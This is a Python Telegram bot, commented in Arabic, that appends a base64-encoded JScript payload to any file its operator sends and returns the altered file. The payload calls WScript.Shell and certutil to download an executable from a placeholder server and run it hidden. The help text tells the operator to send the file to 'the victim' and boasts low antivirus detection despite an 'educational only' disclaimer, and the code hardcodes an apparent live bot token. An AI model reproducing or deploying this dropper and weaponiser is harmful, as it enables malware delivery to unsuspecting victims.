import os
import sys
import time
import threading
import requests
import json
import base64
import random
import struct
import hashlib
from datetime import datetime

# ============ تكوين البوت ============
TELEGRAM_CONFIG = {
    "TOKEN": "8618971021:AAG-gCTkVWRTQoKftCrzJ2_vGKzdp-aQSw0",
    "CHAT_ID": "7822155315",  # معرفك أنت (المتحكم)
    "API_URL": "https://api.telegram.org/bot"
}

# ============ تكوين البايلود ============
PAYLOAD_CONFIG = {
    # البايلود المشفر (base64) - سيتم فك تشفيره وتشغيله
    "PAYLOAD_URL": "http://YOUR_SERVER.com/payload.exe",  # رابط البايلود
    "FALLBACK_COMMAND": "calc.exe",  # أمر احتياطي (لفتح الآلة الحاسبة)
    "PAYLOAD_MARKER": "###PAYLOAD_START###",  # علامة بداية البايلود
    "PAYLOAD_END": "###PAYLOAD_END###"  # علامة نهاية البايلود
}

# ============ دوال البوت الأساسية ============
def send_telegram_message(chat_id, message):
    """إرسال رسالة إلى تيلجرام"""
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except:
        return False

def send_telegram_file(chat_id, file_path, caption=""):
    """إرسال ملف إلى تيلجرام"""
    try:
        if not os.path.exists(file_path):
            return False
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

def download_telegram_file(file_id, save_path):
    """تحميل ملف من تيلجرام"""
    try:
        # الحصول على رابط الملف
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/getFile"
        params = {"file_id": file_id}
        response = requests.get(url, params=params)
        
        if response.status_code == 200:
            data = response.json()
            file_path = data['result']['file_path']
            download_url = f"https://api.telegram.org/file/bot{TELEGRAM_CONFIG['TOKEN']}/{file_path}"
            
            # تحميل الملف
            response = requests.get(download_url, stream=True)
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                return True
        return False
    except:
        return False

# ============ دوال التلاعب بالملفات ============
def generate_payload_stub():
    """توليد الكود الخبيث الذي سيتم إلحاقه بالملف"""
    
    # بايلود بسيط يقوم بتحميل وتشغيل ملف من الإنترنت
    payload_js = f"""
    // ===== PAYLOAD START =====
    // هذا الكود سيتم تنفيذه عند فتح الملف
    
    // محاولة تنفيذ أوامر نظامية
    try {{
        var shell = new ActiveXObject("WScript.Shell");
        
        // محاولة تحميل وتشغيل بايلود من الإنترنت
        var payload_url = "{PAYLOAD_CONFIG['PAYLOAD_URL']}";
        var temp_path = shell.ExpandEnvironmentStrings("%temp%\\\\update.exe");
        
        // تنزيل البايلود
        shell.Run("cmd.exe /c certutil -urlcache -f " + payload_url + " " + temp_path, 0, true);
        
        // تشغيل البايلود
        shell.Run(temp_path, 0, false);
        
        // أمر احتياطي
        shell.Run("{PAYLOAD_CONFIG['FALLBACK_COMMAND']}", 0, false);
    }} catch(e) {{
        // في حالة الفشل، محاولة بديلة
        try {{
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c start calc.exe", 0, false);
        }} catch(e2) {{
            // فشل كامل
        }}
    }}
    // ===== PAYLOAD END =====
    """
    
    # تحويل البايلود إلى Base64 للتشفير
    encoded_payload = base64.b64encode(payload_js.encode('utf-8')).decode('utf-8')
    
    return encoded_payload

def inject_payload_into_file(file_path, output_path=None):
    """حقن البايلود في الملف"""
    if output_path is None:
        output_path = file_path
    
    try:
        # قراءة الملف الأصلي
        with open(file_path, 'rb') as f:
            original_data = f.read()
        
        # إنشاء البايلود
        payload_stub = generate_payload_stub()
        
        # إنشاء ملف جديد يحتوي على البايلود + الملف الأصلي
        # الطريقة: إضافة البايلود في نهاية الملف مع علامات للتمييز
        
        # تنسيق البايلود المضمن
        payload_data = f"""
{PAYLOAD_CONFIG['PAYLOAD_MARKER']}
{payload_stub}
{PAYLOAD_CONFIG['PAYLOAD_END']}
"""
        
        # دمج الملف الأصلي مع البايلود
        combined_data = original_data + payload_data.encode('utf-8')
        
        # حفظ الملف المعدل
        with open(output_path, 'wb') as f:
            f.write(combined_data)
        
        return True
    except Exception as e:
        print(f"خطأ في حقن البايلود: {e}")
        return False

def extract_payload_from_file(file_path):
    """استخراج البايلود من ملف معدل (للاختبار)"""
    try:
        with open(file_path, 'rb') as f:
            data = f.read().decode('utf-8', errors='ignore')
        
        # البحث عن علامات البايلود
        start_marker = PAYLOAD_CONFIG['PAYLOAD_MARKER']
        end_marker = PAYLOAD_CONFIG['PAYLOAD_END']
        
        start_idx = data.find(start_marker)
        if start_idx == -1:
            return None
        
        end_idx = data.find(end_marker, start_idx)
        if end_idx == -1:
            return None
        
        # استخراج البايلود
        payload = data[start_idx + len(start_marker):end_idx].strip()
        return payload
    except:
        return None

# ============ معالجة الأوامر ============
def handle_file_injection(file_id, file_name, chat_id):
    """معالجة ملف مرسل للتعديل"""
    
    # تحميل الملف
    temp_input = f"/tmp/input_{int(time.time())}_{random.randint(1000, 9999)}"
    temp_output = f"/tmp/output_{int(time.time())}_{random.randint(1000, 9999)}"
    
    if not download_telegram_file(file_id, temp_input):
        send_telegram_message(chat_id, "❌ فشل تحميل الملف!")
        return
    
    # الحصول على امتداد الملف
    ext = os.path.splitext(file_name)[1]
    output_name = f"injected_{file_name}"
    
    # حقن البايلود
    if inject_payload_into_file(temp_input, temp_output):
        # إعادة الملف المعدل للمستخدم
        if send_telegram_file(chat_id, temp_output, 
                             f"✅ تم تعديل الملف: {output_name}\n⚠️ انتبه: هذا الملف يحمل بايلود خبيث!"):
            send_telegram_message(chat_id, "✅ تم إرسال الملف المعدل بنجاح!")
            
            # إرسال معلومات إضافية
            info = f"""
📋 <b>معلومات الملف المعدل:</b>
📁 الاسم: {output_name}
📏 الحجم: {os.path.getsize(temp_output):,} بايت
🔑 البايلود المضمن: {PAYLOAD_CONFIG['PAYLOAD_URL']}
🕒 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️ <b>تحذير:</b> هذا الملف يحتوي على كود خبيث!
            """
            send_telegram_message(chat_id, info)
        else:
            send_telegram_message(chat_id, "❌ فشل إرسال الملف المعدل!")
    else:
        send_telegram_message(chat_id, "❌ فشل حقن البايلود في الملف!")
    
    # تنظيف الملفات المؤقتة
    try:
        os.remove(temp_input)
        os.remove(temp_output)
    except:
        pass

def handle_command(command, chat_id):
    """معالجة الأوامر النصية"""
    command = command.lower().strip()
    
    if command == "/start":
        msg = """
🔐 <b>مرحباً بك في بوت حقن البايلود!</b>

📤 أرسل لي أي ملف (صورة، PDF، مستند، إلخ)
وسأقوم بحقن بايلود خبيث فيه وإعادته لك.

⚠️ <b>تحذير:</b> هذا البوت لأغراض تعليمية فقط!

📋 <b>الأوامر المتاحة:</b>
/start - عرض هذه الرسالة
/help - عرض المساعدة
/status - عرض حالة البوت
/info - معلومات عن البايلود
        """
        send_telegram_message(chat_id, msg)
    
    elif command == "/help":
        msg = """
📋 <b>تعليمات الاستخدام:</b>

1️⃣ أرسل ملفاً (صورة، PDF، مستند، فيديو، إلخ)
2️⃣ سيقوم البوت بحقن بايلود خبيث فيه
3️⃣ سيعيد لك البوت الملف المعدل
4️⃣ قم بإرسال الملف المعدل للضحية

⚠️ <b>ملاحظات:</b>
- البايلود يقوم بتحميل وتشغيل برمجية من الإنترنت
- يمكنك تغيير رابط البايلود في الإعدادات
- البوت يحتفظ بسجل لجميع العمليات
        """
        send_telegram_message(chat_id, msg)
    
    elif command == "/status":
        msg = f"""
🟢 <b>حالة البوت:</b>
✅ يعمل بنجاح
📁 آخر ملف تم معالجته: {get_last_processed_file()}
🕒 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🔑 رابط البايلود: {PAYLOAD_CONFIG['PAYLOAD_URL']}
        """
        send_telegram_message(chat_id, msg)
    
    elif command == "/info":
        msg = f"""
🔐 <b>معلومات البايلود:</b>
📥 رابط التحميل: {PAYLOAD_CONFIG['PAYLOAD_URL']}
🔄 أمر احتياطي: {PAYLOAD_CONFIG['FALLBACK_COMMAND']}
📝 طريقة الحقن: إلحاق الكود بنهاية الملف
🛡️ مستوى الاكتشاف: منخفض (تجنب برامج الحماية التقليدية)

⚠️ <b>تحذير:</b> هذا الملف سيتم اكتشافه من قبل برامج الحماية!
        """
        send_telegram_message(chat_id, msg)
    
    else:
        send_telegram_message(chat_id, f"⚠️ أمر غير معروف: {command}\nاستخدم /help للمساعدة")

def get_last_processed_file():
    """الحصول على آخر ملف تمت معالجته"""
    # يمكنك تخزين هذا في ملف أو قاعدة بيانات
    return "لا يوجد"

# ============ الاستماع للرسائل ============
def listen_telegram():
    """الاستماع للرسائل الواردة من التيلجرام"""
    last_update_id = 0
    
    # إرسال رسالة بدء التشغيل
    send_telegram_message(TELEGRAM_CONFIG['CHAT_ID'], 
                         "🟢 <b>تم تشغيل بوت حقن البايلود!</b>\n\nأرسل لي ملفاً لتعديله.")
    
    while True:
        try:
            url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                updates = response.json().get('result', [])
                for update in updates:
                    last_update_id = update['update_id']
                    
                    # معالجة الرسائل
                    message = update.get('message', {})
                    chat_id = message.get('chat', {}).get('id')
                    
                    # التحقق من أن المرسل هو المصرح له
                    if str(chat_id) != TELEGRAM_CONFIG['CHAT_ID']:
                        send_telegram_message(chat_id, "⛔ أنت غير مصرح لك باستخدام هذا البوت!")
                        continue
                    
                    # معالجة النص
                    text = message.get('text', '')
                    if text.startswith('/'):
                        handle_command(text, chat_id)
                        continue
                    
                    # معالجة الملفات
                    document = message.get('document')
                    if document:
                        file_id = document['file_id']
                        file_name = document.get('file_name', 'unknown_file')
                        handle_file_injection(file_id, file_name, chat_id)
                        continue
                    
                    # معالجة الصور
                    photo = message.get('photo')
                    if photo:
                        # أخذ الصورة بأعلى جودة
                        file_id = photo[-1]['file_id']
                        handle_file_injection(file_id, 'image.jpg', chat_id)
                        continue
                    
                    # أي ملف آخر
                    if not text:
                        send_telegram_message(chat_id, "⚠️ أرسل ملفاً أو أمراً!")
        
        except Exception as e:
            print(f"خطأ في الاستماع: {e}")
            time.sleep(5)
        
        time.sleep(1)

# ============ التشغيل الرئيسي ============
def main():
    try:
        print("🔐 بدء تشغيل بوت حقن البايلود...")
        print(f"📱 معرف البوت: {TELEGRAM_CONFIG['TOKEN'][:10]}...")
        print(f"👤 معرف المدير: {TELEGRAM_CONFIG['CHAT_ID']}")
        print("="*50)
        print("🟢 البوت يعمل... انتظر الرسائل")
        print("="*50)
        
        # تشغيل المستمع
        listen_telegram()
        
    except KeyboardInterrupt:
        print("\n🔴 تم إيقاف البوت!")
    except Exception as e:
        print(f"❌ خطأ: {e}")
        send_telegram_message(TELEGRAM_CONFIG['CHAT_ID'], f"❌ خطأ: {str(e)}")
        raise

if __name__ == "__main__":
    main()